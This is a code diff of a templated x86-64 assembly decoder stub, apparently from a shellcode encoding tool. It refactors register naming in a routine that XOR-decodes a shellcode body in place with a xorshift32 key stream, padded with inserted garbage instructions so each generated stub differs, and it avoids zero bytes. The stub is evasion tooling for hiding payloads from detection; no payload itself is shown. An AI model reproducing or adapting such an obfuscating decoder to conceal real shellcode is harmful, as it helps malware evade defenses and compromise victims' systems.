@@ -7,7 +7,6 @@
 // "0x00, 0x00, 0x00" and "0xFF, 0xFF, 0xFF"
 // about call or jmp instructions
 
-// dr is used to get the register low 32bit
 // igi means insert garbage instruction
 // igs means insert garbage instruction with short version
 
@@ -28,13 +27,13 @@ header:
   push {{.Reg.rdi}}                            {{igi}}
   pushfq                                       {{igi}}
 
-  mov {{dr .Reg.rax}}, {{hex .Seed}}           {{igi}}
-  mov {{dr .Reg.rbx}}, {{hex .Key}}            {{igi}}
+  mov {{.Reg.eax}}, {{hex .Seed}}              {{igi}}
+  mov {{.Reg.ebx}}, {{hex .Key}}               {{igi}}
 
   // prevent continuous 0x00
-  mov {{dr .Reg.rcx}}, {{hex .NumLoopStub}}    {{igi}}
-  xor {{dr .Reg.rcx}}, {{hex .NumLoopMaskA}}   {{igi}}
-  xor {{dr .Reg.rcx}}, {{hex .NumLoopMaskB}}   {{igi}}
+  mov {{.Reg.ecx}}, {{hex .NumLoopStub}}       {{igi}}
+  xor {{.Reg.ecx}}, {{hex .NumLoopMaskA}}      {{igi}}
+  xor {{.Reg.ecx}}, {{hex .NumLoopMaskB}}      {{igi}}
 
   // calculate the body address
   lea {{.Reg.rsi}}, [rip + body + {{hex .OffsetT}}]   {{igi}}
@@ -43,12 +42,12 @@ header:
 
   // decode shellcode body
  loop_xor:
-  mov {{dr .Reg.rdi}}, [{{.Reg.rsi}}]          {{igs}}
-  ror {{dr .Reg.rdi}}, 17                      {{igs}}
-  xor {{dr .Reg.rdi}}, {{dr .Reg.rax}}         {{igs}}
-  rol {{dr .Reg.rdi}}, 7                       {{igs}}
-  xor {{dr .Reg.rdi}}, {{dr .Reg.rbx}}         {{igs}}
-  mov [{{.Reg.rsi}}], {{dr .Reg.rdi}}          {{igs}}
+  mov {{.Reg.edi}}, [{{.Reg.rsi}}]             {{igs}}
+  ror {{.Reg.edi}}, 17                         {{igs}}
+  xor {{.Reg.edi}}, {{.Reg.eax}}               {{igs}}
+  rol {{.Reg.edi}}, 7                          {{igs}}
+  xor {{.Reg.edi}}, {{.Reg.ebx}}               {{igs}}
+  mov [{{.Reg.rsi}}], {{.Reg.edi}}             {{igs}}
 
   // call xor shift 32
   jmp xor_shift_32                             {{igs}}
@@ -56,22 +55,22 @@ header:
 
   // update address and counter
   add {{.Reg.rsi}}, 4                          {{igs}}
-  dec {{dr .Reg.rcx}}                          {{igs}}
+  dec {{.Reg.ecx}}                             {{igs}}
   jnz loop_xor                                 {{igs}}
 
   // jump to the loader or shellcode
   jmp restore                                  {{igs}}
 
 xor_shift_32:
-  mov {{dr .Reg.rdx}}, {{dr .Reg.rax}}         {{igs}}
-  shl {{dr .Reg.rdx}}, 13                      {{igs}}
-  xor {{dr .Reg.rax}}, {{dr .Reg.rdx}}         {{igs}}
-  mov {{dr .Reg.rdx}}, {{dr .Reg.rax}}         {{igs}}
-  shr {{dr .Reg.rdx}}, 17                      {{igs}}
-  xor {{dr .Reg.rax}}, {{dr .Reg.rdx}}         {{igs}}
-  mov {{dr .Reg.rdx}}, {{dr .Reg.rax}}         {{igs}}
-  shl {{dr .Reg.rdx}}, 5                       {{igs}}
-  xor {{dr .Reg.rax}}, {{dr .Reg.rdx}}         {{igs}}
+  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igs}}
+  shl {{.Reg.edx}}, 13                         {{igs}}
+  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igs}}
+  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igs}}
+  shr {{.Reg.edx}}, 17                         {{igs}}
+  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igs}}
+  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igs}}
+  shl {{.Reg.edx}}, 5                          {{igs}}
+  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igs}}
   jmp ret_1                                    {{igs}}
 
  restore:
